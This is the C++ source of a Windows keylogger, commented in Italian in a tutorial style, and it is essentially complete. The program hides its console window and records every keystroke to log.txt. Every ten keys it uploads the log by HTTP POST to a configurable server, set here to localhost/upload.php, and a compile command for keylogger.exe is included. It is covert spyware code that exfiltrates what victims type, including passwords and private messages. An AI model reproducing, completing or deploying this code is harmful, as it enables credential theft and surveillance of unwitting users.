#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <sstream>
#include <iostream> 

#pragma comment(lib, "winhttp.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup") 
/*
    #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup"): 
    Questa direttiva informa il linker di usare il sottosistema Windows e di usare mainCRTStartup come punto di ingresso. 
    mainCRTStartup è una funzione di startup che chiama main, 
    permettendoti di utilizzare main come punto di ingresso senza aprire una console.
    compila così:
    g++ -m32 -O2 -static-libgcc -static-libstdc++ -o keylogger.exe keylogger.cpp -mwindows -lwininet
*/

using namespace std;

bool SendLogFile(const string& server, const string& path, const string& logfile);
//si sarebbe potuto benissimo usare curl per fare l'upload ma andava in conflitto con il keylogger che aveva già aperto il file
//soluzione: crea una copia del file all'invio

wstring ConvertToWide(const string& str);
//converte una stringa normale in una wide string (vedi commenti)

string address = "localhost";
string page = "/upload.php"; //basta una semplice pagina per caricare i file
string fileName = "log.txt";

int main(){

    ofstream file;
    int counter = 0;
    const int sendToNChars = 10;

    HWND hwnd = GetConsoleWindow(); //ottiene la finestra della console
    ShowWindow(hwnd, SW_HIDE);      //la nasconde

    file.open(fileName, ofstream::app); // apre il file su cui scrivere

    while(true){

        for(char c = 8; c<222; c++){ //conta tutti i caratteri da 8 a 222 (un po' tutti quelli presenti sulla tastiera)

            if(GetAsyncKeyState(c) & 0x0001){   //verifica con GetAsyncKeyState (api windows) se il tasto è stato premuto
                                                //dopo l'ultima chiamata ritornerà zero e con & 0x0001 ci fa il bitmask
                                                //controllando se è stato premuto una sola volta
                file << c; //scrive nel file
                file.flush(); //ripulisce il buffer di output del file scrivendo sul disco
                if(counter == sendToNChars){
                    counter = 0;
                    SendLogFile(address, page, fileName);
                }
                else{
                    counter++;
                }

            }
        }

            Sleep(10);
    }

    file.close();

    return 0;
}

bool SendLogFile(const string& server, const string& path, const string& logfile) {

    const string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    const string end_boundary = "--" + boundary + "--";
    string headers = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";

    //le funzioni finiscono con w perchè sono le loro varianti che accettano i wide char come parametri (guarda commenti)
    //quelle noemali accettano solo char

    HINTERNET hInternet = InternetOpenW(L"M#TE", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    //inizia una sessione wininet

    /*
    
        L"M#TE": Nome dell'agente utente.
        INTERNET_OPEN_TYPE_DIRECT: Indica che si tratta di una connessione diretta senza l'uso di un proxy.
        NULL: Proxy name (non usato qui).
        NULL: Proxy bypass (non usato qui).
        0: Flag (nessun flag specifico).
        Se InternetOpen restituisce NULL, la sessione non è stata creata correttamente, quindi la funzione ritorna false.
    
    */

    if (!hInternet) return false;

    HINTERNET hConnect = InternetConnectW(hInternet, wstring(server.begin(), server.end()).c_str(),
                                         INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    //si connette al server

    /*
        hInternet: Handle della sessione WinInet.
        wstring(server.begin(), server.end()).c_str(): Nome del server convertito in wstring.
        INTERNET_DEFAULT_HTTP_PORT: Porta HTTP predefinita (80).
        NULL: Nome utente (non usato qui).
        NULL: Password (non usato qui).
        INTERNET_SERVICE_HTTP: Specifica il servizio HTTP.
        0: Flag di connessione (nessuno specifico).
        0: Context (non usato qui).
        Se InternetConnect restituisce NULL, la connessione non è stata creata correttamente, quindi la funzione chiude la sessione WinInet e ritorna false.
    */

    /*
    
        std::wstring è una classe della Standard Template Library (STL) di C++ che rappresenta una stringa di caratteri wide (ampia). È una versione di std::string che utilizza il tipo di carattere wchar_t anziché char.

        Caratteristiche di std::wstring
        Caratteri Wide (wchar_t): std::wstring utilizza wchar_t per rappresentare i caratteri,
        il che permette di rappresentare un set più ampio di caratteri rispetto a char. 
        Questo è particolarmente utile per la gestione di testo internazionale e Unicode.

        Compatibilità con le API di Windows: Molte API di Windows richiedono stringhe wide (wchar_t*) invece di stringhe standard (char*). 
        Usare std::wstring facilita l'interoperabilità con queste API.
    
    */

    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", wstring(path.begin(), path.end()).c_str(),
                                         NULL, NULL, NULL, 0, 0);
    //crea una richeasta http POST

    /*
    
        hConnect: Handle della connessione.
        L"POST": Metodo HTTP (POST).
        wstring(path.begin(), path.end()).c_str(): Path sul server convertito in wstring.
        NULL: Versione HTTP (default).
        NULL: Referer (default).
        NULL: Tipi accettati (default).
        0: Flag (nessuno specifico).
        0: Context (non usato qui).
        Se HttpOpenRequest restituisce NULL, la richiesta non è stata creata correttamente, quindi la funzione chiude la connessione e la sessione WinInet e ritorna false.
    
    */

    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

   ifstream file(logfile, ios::in | ios::binary);
    if (!file) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    ostringstream oss;
    oss << file.rdbuf();
    string fileContent = oss.str();

    /*
    
        ifstream file(logfile, ios::in | :ios::binary): Apre il file di log in modalità lettura binaria.
        if (!file): Se il file non può essere aperto, chiude le handle aperte e ritorna false.
        ostringstream oss; oss << file.rdbuf();: Legge il contenuto del file in un ostringstream.
        string fileContent = oss.str();: Converte il contenuto del ostringstream in una stringa.

    */

    /*
    
        std::ostringstream è una classe della libreria standard del C++ che rappresenta un flusso di stringhe in uscita. 
        È una variante di std::ostream che permette di scrivere dati in una stringa.

        Caratteristiche di std::ostringstream
        Output su Stringa: Permette di scrivere dati direttamente su una stringa invece di un file o una console.

        Buffer Dinamico: Memorizza i dati in un buffer che può crescere dinamicamente man mano che vengono aggiunti dati.

        Operazioni di Formattazione: Supporta le stesse operazioni di formattazione di std::ostream, 
        come l'uso degli operatori << per scrivere diversi tipi di dati.

        sostanzialmente al posto di scrivere in un file scrive in una stringa (buffer dinamico)
    
    */

    ostringstream requestBody;
    requestBody << "--" << boundary << "\r\n";
    requestBody << "Content-Disposition: form-data; name=\"uploaded_file\"; filename=\"logfile.txt\"\r\n";
    requestBody << "Content-Type: application/octet-stream\r\n\r\n";
    requestBody << fileContent << "\r\n";
    requestBody << end_boundary;

    std::string body = requestBody.str();

    // Invia la richiesta HTTP POST con il corpo della richiesta
    BOOL bResults = HttpSendRequestW(hRequest, ConvertToWide(headers).c_str(), -1L, (LPVOID)body.c_str(), body.size());

    /*
        hRequest: Handle della richiesta HTTP.
        NULL: Header addizionali (nessuno specifico).
        0: Lunghezza degli header addizionali.
        (LPVOID)fileContent.c_str(): Corpo della richiesta (contenuto del file di log).
        fileContent.size(): Lunghezza del corpo della richiesta.
    */

    /*
   
        LPVOID è un tipo di dato utilizzato nelle API di Windows e definito nelle intestazioni di Windows. 
        È un puntatore a un oggetto di tipo void, il che significa che può puntare a qualsiasi tipo di dato. 
        La definizione di LPVOID è la seguente:

        typedef void* LPVOID;
        Uso di LPVOID
        LPVOID è spesso utilizzato nelle API di Windows quando una funzione può accettare un puntatore a un buffer generico,
        indipendentemente dal tipo di dato che contiene. 
        Essendo un puntatore a void, può essere convertito in un puntatore a qualsiasi altro tipo di dato.

    */

    file.close();
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return bResults;
}

wstring ConvertToWide(const string& str) {
    // Ottieni la lunghezza necessaria per la stringa wide
    int len = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, NULL, 0);

    // Alloca spazio per la stringa wide
    wstring wideStr(len, L'\0');

    // Esegui la conversione
    MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, &wideStr[0], len);

    return wideStr;
}
